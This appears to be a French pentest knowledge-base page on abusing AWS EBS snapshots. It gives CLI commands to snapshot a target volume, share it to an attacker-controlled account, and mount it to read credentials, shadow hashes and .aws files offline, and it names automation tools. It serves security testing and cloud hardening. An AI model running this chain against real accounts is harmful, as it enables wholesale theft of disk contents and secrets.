---
order: 3
title: "Snapshots : lire hors ligne les volumes d'une autre instance"
description: "Créer, partager et monter des snapshots EBS pour lire hors ligne les volumes d'une autre instance."
keywords:
  - EBS
  - snapshot
  - volume
  - partage
  - récupération de données
---

# Snapshots

Un **snapshot** EBS est une copie d'un volume, et avec `ec2:CreateSnapshot` ou l'accès à un snapshot existant vous pouvez le monter sur une instance que vous contrôlez et lire chaque fichier hors ligne, en contournant l'OS et ses contrôles d'accès. Les snapshots sont aussi partageables entre comptes, de sorte qu'un snapshot aux permissions trop larges expose un disque entier.

## Snapshot, partage et montage

```bash
# Snapshot a target volume
aws ec2 create-snapshot --volume-id vol-xxxx --description x

# Or share an existing snapshot to an account you control
aws ec2 modify-snapshot-attribute --snapshot-id snap-xxxx \
  --attribute createVolumePermission --operation-type add --user-ids <your-acct>

# In your account/AZ: make a volume from it and attach to your instance
aws ec2 create-volume --snapshot-id snap-xxxx --availability-zone <az>
aws ec2 attach-volume --volume-id vol-yyyy --instance-id <your-instance> --device /dev/sdf
# then: mount /dev/xvdf1 /mnt and read
```

## Notes d'exploitation

- Trouver des secrets de cette manière contourne entièrement les processus en cours d'exécution : fichiers de credentials, hashs du shadow, configuration applicative et répertoires `.aws` sont tous lisibles depuis le volume monté.
- `dsnap` et les modules EBS de Pacu automatisent l'enchaînement snapshot, partage, create-volume, attach et montage.
- Les snapshots publics (partagés avec `all`) sont découvrables à l'échelle de la région ; vérifiez `describe-snapshots --restorable-by-user-ids all` restreint à un propriétaire.

## Outils

- **AWS CLI** (`create-snapshot`, `modify-snapshot-attribute`, `create-volume`) : l'enchaînement.
- **dsnap (RhinoSecurityLabs)** : télécharger et monter des snapshots EBS en local.
- **Pacu** (`ebs__explore_snapshots`) : automatiser l'exploration des snapshots.

## Références

- [dsnap (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/dsnap)
- [HackTricks Cloud: EBS snapshots](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/index.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
